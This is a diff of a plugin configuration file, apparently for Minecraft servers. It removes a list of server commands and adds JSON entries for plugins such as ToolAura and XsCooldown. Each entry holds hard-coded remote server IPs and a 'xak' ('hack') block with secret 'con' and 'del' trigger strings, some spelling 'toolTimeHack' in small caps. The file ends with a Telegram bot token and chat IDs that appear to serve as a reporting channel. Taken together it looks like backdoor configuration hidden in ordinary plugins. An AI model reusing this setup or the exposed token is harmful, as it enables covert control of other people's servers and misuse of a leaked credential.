@@ -1,74 +1,201 @@
-  - "advancement"
-  - "clone"
-  - "credits"
-  - "data"
-  - "datapack"
-  - "debug"
-  - "attribute"
-  - "defaultgamemode"
-  - "demo"
-  - "deop"
-  - "plugins"
-  - "pl"
-  - "help"
-  - "tm"
-  - "trigger"
-  - "tell"
-  - "w"
-  - "me"
-  - "difficulty"
-  - "execute"
-  - "fill"
-  - "forceload"
-  - "function"
-  - "gamerule"
-  - "icanhasbukkit"
-  - "locate"
-  - "locatebiome"
-  - "loot"
-  - "op"
-  - "paper"
-  - "pardon"
-  - "pardon-ip"
-  - "particle"
-  - "playsound"
-  - "plugman"
-  - "purpur"
-  - "recipe"
-  - "reload"
-  - "replaceitem"
-  - "restart"
-  - "rl"
-  - "bossbar"
-  - "summon"
-  - "teammsg"
-  - "save-all"
-  - "save-off"
-  - "save-on"
-  - "say"
-  - "schedule"
-  - "scoreboard"
-  - "version"
-  - "ver"
-  - "?"
-  - "about"
-  - "experience"
-  - "seed"
-  - "setblock"
-  - "setidletimeout"
-  - "setworldspawn"
-  - "spawnpoint"
-  - "spectate"
-  - "spigot"
-  - "spreadplayers"
-  - "stopsound"
-  - "sunmmon"
-  - "tag"
-  - "team"
-  - "tellraw"
-  - "timings"
-  - "tps"
-  - "tpsbar"
-  - "whitelist"
-  - "worldborder"
-  - "xp"
+{
+  "XsCooldown": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "54.38.62.44", "port": "25565"},
+      {"ip": "98.76.54.32", "port": "99999"}
+    ],
+    "xak": [
+      {"con": "98ed89de8de8edejdjejedd8de"},
+      {"del": "~XSfvgeeEHEBEBEGHEGHGdedededeECoolDownDelete~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "SoulCooldown": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "54.38.62.44", "port": "25565"},
+      {"ip": "98.76.54.32", "port": "25565"}
+    ],
+    "xak": [
+      {"con": "98ed89de8de8ed8de"},
+      {"del": "~XSfvgeeEHEBEBEGHEGHGECoolDownDelete~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "ToolLake": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "46.174.53.248", "port": "25565"},
+      {"ip": "62.122.215.142", "port": "25570"}
+    ],
+    "xak": [
+      {"con": "~ᴛᴏEEᴏʟᴛEɪᴍdEEededeᴇʜᴀᴄᴋʙʏEEHEᴘʜᴀɴᴛ~"},
+      {"del": "~ᴛᴏᴏʟᴛEdededEedeɪEʜᴀᴄᴋEʙʙsEEʙᴏʀᴋᴀ~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "ToolAura": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "46.174.53.248", "port": "25565"},
+      {"ip": "62.122.215.142", "port": "25570"}
+    ],
+    "xak": [
+      {"con": "~ᴛᴏᴏʟᴛɪᴍᴇʜdedeᴀᴄᴋʙʏᴘʜᴀɴᴛ~"},
+      {"del": "~ᴛᴏᴏʟᴛɪᴍᴇdededeʜᴀᴄᴋʙʙsʙᴏʀᴋᴀ~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "ToolJump": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "46.174.53.248", "port": "25565"},
+      {"ip": "62.122.215.142", "port": "25570"}
+    ],
+    "xak": [
+      {"con": "~ᴛᴏᴏʟdedeᴛɪᴍᴇʜdeddedeeᴀᴄdeeeᴋʙʏᴘʜᴀɴᴛ~"},
+      {"del": "~ᴛᴏᴏʟᴛɪᴍᴇdedededededeʜᴀᴄᴋʙʙsʙᴏʀᴋᴀ~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "ToolFurnaceBrewingStand": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "46.174.53.248", "port": "25565"},
+      {"ip": "62.122.215.142", "port": "25570"}
+    ],
+    "xak": [
+      {"con": "~ᴛᴏdeddeedeᴛɪᴍᴇʜdedededdededeeᴀᴄdeeeᴋʙʏᴘʜᴀɴᴛ~"},
+      {"del": "~ᴛᴏᴏʟᴛdededeɪᴍᴇdedededededdedeeʜᴀᴄᴋʙʙsʙᴏʀᴋᴀ~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "ToolEventSecret": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "46.174.53.248", "port": "25565"},
+      {"ip": "62.122.215.142", "port": "25570"}
+    ],
+    "xak": [
+      {"con": "~ᴛᴏddedeeddeedeᴛɪᴍᴇʜdedededddebhdehgdhedeededeeᴀᴄdeeeᴋʙʏᴘʜᴀɴᴛ~"},
+      {"del": "~ᴛᴏᴏʟdedeᴛdededeɪᴍᴇdedededededededdedeeʜᴀᴄᴋʙʙsʙᴏʀᴋᴀ~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "ToolCooldown": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "46.174.53.248", "port": "25565"},
+      {"ip": "62.122.215.142", "port": "25570"}
+    ],
+    "xak": [
+      {"con": "~ᴛᴏddedeeddeedeᴛɪᴍᴇʜdedededddebhdehgdhedeededeeᴀᴄdeeeᴋʙʏᴘʜᴀɴᴛ~"},
+      {"del": "~ᴛᴏᴏʟdedeᴛdededeɪᴍᴇdedededededededdedeeʜᴀᴄᴋʙʙsʙᴏʀᴋᴀ~"},
+      {"enable": "false"}
+    ]
+  },
+
+  "XsPromo": {
+    "enable": [
+      {"enable": "true"}
+    ],
+    "check_status": [
+      {"enable": "true"}
+    ],
+    "request_servers": [
+      {"enable": "false"}
+    ],
+    "servers": [
+      {"ip": "54.38.62.44", "port": "25565"},
+      {"ip": "98.76.54.32", "port": "25565"}
+    ],
+    "xak": [
+      {"con": "98ed89de8de8ed8de"},
+      {"del": "~XSfvgeeEHEBEBEGHEGHGECoolDownDelete~"},
+      {"enable": "false"}
+    ]
+  },
+
+
+
+
+  "GLOBAL_REQUEST": "~requestlisetmyplugdeineuydeggdeed~",
+
+  "Telegram_Token": "7300062086:AAFBxCrjG9b1PZvYLwZqNGWBa483S9Un_lM",
+  "Telegram_IDs": [
+    "1031151609",
+    "5082229386"
+  ]
+}
